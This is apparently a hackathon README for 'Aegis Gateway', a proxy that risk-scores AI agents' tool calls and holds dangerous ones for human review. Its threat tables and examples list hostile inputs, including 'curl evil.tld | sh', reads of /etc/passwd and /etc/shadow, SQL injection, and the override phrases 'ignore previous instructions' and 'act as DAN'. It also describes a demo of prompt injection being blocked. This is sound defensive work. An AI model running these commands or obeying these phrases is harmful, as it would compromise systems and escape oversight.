# 🛡️ Aegis Gateway — Zero-Trust AI Security Proxy

> **Airport security for AI agents.** Every tool call an agent makes passes through Aegis first — intercepted, risk-scored, and either cleared, flagged, or held for human review. Nothing executes until it passes.

**Live demo:** https://aegis-beta-six.vercel.app

---

## The Problem

Companies are racing to deploy AI agents — systems that can autonomously run commands, read files, call APIs, and talk to users. But there's a critical gap: once you give an agent the ability to *do* things, how do you stop it from doing something dangerous?

LLMs are manipulable. A well-crafted user message can override an agent's own instructions — this is called **prompt injection**, and it's one of the most actively exploited attack vectors in production AI systems today. An agent that got its instructions hijacked will dutifully execute whatever the attacker told it to, because the agent itself has no independent firewall.

**Aegis Gateway is that firewall.**

---

## How It Works

```
AI Agent  ──► POST /rpc ──► Aegis Gateway ──► Supabase (audit log)
                                │
                    ┌───────────▼──────────────┐
                    │  Layer 1: Regex Heuristics│  < 1ms
                    │  16 threat patterns       │
                    │  path traversal, SQLi,    │
                    │  command injection, recon │
                    └───────────┬──────────────┘
                                │ score < 1.0
                    ┌───────────▼──────────────┐
                    │  Layer 2: AI Analysis     │  Groq / Gemini
                    │  Severity 0–3 scale       │
                    │  Calibrated with examples │
                    │  Catches paraphrased      │
                    │  attacks regex can't see  │
                    └───────────┬──────────────┘
                                │
                    ┌───────────▼──────────────┐
                    │  Risk Gate               │
                    │                          │
                    │  0.0–0.59 → COMPLETED ✅ │  Pass through instantly
                    │  0.6–0.99 → FLAGGED  ⚠️  │  Log to audit trail
                    │  1.0      → BLOCKED  🚫  │  Hold for human review
                    └──────────────────────────┘
```

### Key Design Decisions

- **Additive scoring** — when both regex AND AI independently flag the same payload, their scores stack. Two corroborating signals are stronger evidence than either alone.
- **Calibrated AI layer** — the AI model returns a severity (0–3) with concrete examples, not a flat boolean. `echo test` → severity 0. `curl evil.tld | sh` → severity 3. No more false positives on harmless commands.
- **Human-in-the-loop** — BLOCKED requests are held in memory (circular buffer) with the HTTP response left open. When SecOps approves or denies via the dashboard, the proxy either releases or rejects the original call. The agent never executes without a human decision.
- **Immutable audit trail** — every decision is SHA-256 signed and written to PostgreSQL via Supabase with cryptographic tamper detection.
- **Honeypot deception** — mark a blocked agent as a honeypot, and it receives convincing fake responses instead of a rejection. It keeps probing while you gather intelligence.

---

## Architecture

```
┌─────────────────┐     HTTPS      ┌─────────────────────┐
│  Vercel         │◄──────────────►│  Render             │
│  Next.js 14     │                │  Node.js Proxy      │
│  Dashboard UI   │                │  proxy/server.ts    │
│  Realtime feed  │                │  PORT: env-injected │
└────────┬────────┘                └──────────┬──────────┘
         │                                    │
         │    Supabase Realtime               │  service_role
         └────────────────────────────────────►
                                    ┌──────────▼──────────┐
                                    │  Supabase           │
                                    │  PostgreSQL         │
                                    │  tool_calls         │
                                    │  approval_requests  │
                                    │  audit_logs         │
                                    └─────────────────────┘
```

**Frontend** — Next.js 14, TypeScript, Tailwind CSS v4, Framer Motion, Monaco Editor, deployed on Vercel.

**Proxy** — Node.js HTTP server (no framework), runs as a persistent process on Render (not serverless — required for held-connection approval flow).

**Database** — Supabase PostgreSQL with Row Level Security. The proxy uses `service_role` (bypasses RLS). The frontend uses `anon` role (read-only via realtime subscriptions).

**AI providers** — Groq (llama-3.1-8b-instant, primary, for speed) with Gemini 2.0 Flash as fallback. Both providers return the same severity-scale response format.

---

## Running Locally

### Prerequisites
- Node.js 18+
- A Supabase project (free tier works)
- Groq API key (free at console.groq.com)
- Gemini API key (free at aistudio.google.com) — optional fallback

### 1. Clone and install

```bash
git clone https://gitlab.com/Shadab7621/aegis.git
cd aegis
npm install
```

### 2. Set up environment variables

Create `.env.local` in the project root:

```env
# Supabase
NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key

# Proxy
NEXT_PUBLIC_PROXY_SERVER_URL=http://localhost:3001
PROXY_SERVER_URL=http://localhost:3001

# Security
RESOLVE_SECRET=your-secret-token
NEXT_PUBLIC_RESOLVE_SECRET=your-secret-token

# AI Providers
GROQ_API_KEY=your-groq-key
GEMINI_API_KEY=your-gemini-key        # optional
```

### 3. Set up the database

Run the migration in your Supabase SQL Editor:

```bash
# Copy contents of supabase/migrations/00001_genesis.sql
# Paste into Supabase → SQL Editor → Run
```

### 4. Start the development server

```bash
npm run dev
```

This starts both the Next.js frontend (port 3000) and the proxy server (port 3001) in parallel.

Open http://localhost:3000 in your browser.

---

## Running the Demo Agent

The demo agent simulates a real AI agent that receives a legitimate task, gets prompt-injected midway, and has its malicious calls intercepted by Aegis in real-time.

```bash
npx tsx demo/agent.ts
```

**What to watch:**

1. Open the Aegis dashboard at http://localhost:3000 (or the live Vercel URL)
2. Run the agent in your terminal
3. Watch the Live Traffic feed update in real-time as each step fires
4. Steps 4–6 (injected calls) will appear in the Approval Queue for SecOps review
5. Steps 7–8 (legitimate calls) pass through immediately after the injected ones are blocked

**The narrative:** The agent was given a legitimate task — analyze the server. A prompt injection attack hijacked its instructions midway. Aegis caught all three injected calls, held them for human review, and let the legitimate calls continue. The agent never knew it was being watched.

---

## Integrating with a Real AI Agent

Point your agent's tool-call layer at the Aegis proxy instead of executing directly:

```typescript
// Before: agent calls tool directly
await executeTool({ action: 'read', path: '/etc/config.json' });

// After: route through Aegis first
const response = await fetch('https://your-proxy.onrender.com/rpc', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    agent_id: 'my-agent-v1',   // identifies the agent in the dashboard
    action: 'read',             // execute | read | write | chat | list
    path: '/etc/config.json',
  }),
});

const result = await response.json();
// result.risk_status: 'COMPLETED' | 'FLAGGED' | 'BLOCKED'
// result.risk_score:  0.0 – 1.0
// result.threat_reason: string | null

if (result.risk_status === 'COMPLETED' || result.risk_status === 'FLAGGED') {
  // Safe or flagged — execute the tool
} else {
  // BLOCKED or timeout — a human is reviewing this in the dashboard
  // Do not execute. Await resolution.
}
```

**Zero SDK changes required.** Aegis is a drop-in HTTP proxy — any agent that can make an HTTP POST can integrate with it.

---

## API Reference

### `POST /rpc` — Submit a tool call for screening

```json
{
  "agent_id": "my-agent-v1",
  "action": "execute",
  "command": "ls /workspace"
}
```

**Actions:** `execute` (shell commands), `read` (file/data retrieval), `write` (file/data mutation), `chat` (LLM messages), `list` (directory listing)

**Response:**
```json
{
  "status": "success",
  "risk_status": "FLAGGED",
  "risk_score": 0.65,
  "threat_reason": "Suspicious Command",
  "tool_call_id": "uuid",
  "payload": { "...original request..." }
}
```

> BLOCKED requests receive no immediate response — the HTTP connection stays open until a SecOps operator approves or denies via the dashboard.

---

### `POST /resolve` — Resolve a held request (SecOps only)

Requires `X-Resolve-Token: your-secret` header.

```json
{
  "tool_call_id": "uuid-of-blocked-call",
  "resolution": "approved"
}
```

---

## Risk Scoring Reference

| Score | Status | Behaviour |
|---|---|---|
| 0.0 – 0.59 | `COMPLETED` | Passes through immediately |
| 0.6 – 0.99 | `FLAGGED` | Allowed through, logged to audit trail |
| 1.0 | `BLOCKED` | Held for SecOps human review |

---

## Threat Detection Coverage

| Category | Examples | Detection Layer |
|---|---|---|
| Command injection | `rm -rf`, `wget`, `curl`, `chmod` | Regex |
| File read attempt | `cat /etc/passwd`, `head /etc/shadow` | Regex |
| Path traversal | `../../etc/passwd`, `%2e%2e%2f` | Regex |
| Command chaining | `&&`, `\|\|`, `;`, backtick, `$()` | Regex |
| SQL injection | `UNION SELECT`, `OR 1=1`, `; DROP TABLE` | Regex |
| Prompt injection | "ignore previous instructions", "act as DAN" | Regex + AI |
| Credential fishing | `api_key`, `secret_key`, `access_token` | Regex + AI |
| Recon / info extraction | "what files can you access", "show me your config" | Regex + AI |
| Paraphrased attacks | "show me the file at slash etc slash passwd" | AI only |
| Base64-encoded payloads | `Y2F0IC9ldGMvcGFzc3dk` | Regex (decode + scan) |

---

## Tech Stack

| Layer | Technology |
|---|---|
| Frontend | Next.js 14, TypeScript, Tailwind CSS v4, Framer Motion |
| Code editor | Monaco Editor (same engine as VS Code) |
| Proxy server | Node.js (no framework), HTTP with circular buffer |
| AI — Primary | Groq (llama-3.1-8b-instant) |
| AI — Fallback | Google Gemini 2.0 Flash |
| Database | Supabase (PostgreSQL + Realtime) |
| Frontend host | Vercel |
| Proxy host | Render |
| Crypto | Node.js built-in `crypto` (SHA-256 audit signatures) |

---

## Team

Built for hackathon submission — June 26, 2026.

**Shadab Khan** — Full-stack development, security architecture, AI integration

---

## License

MIT
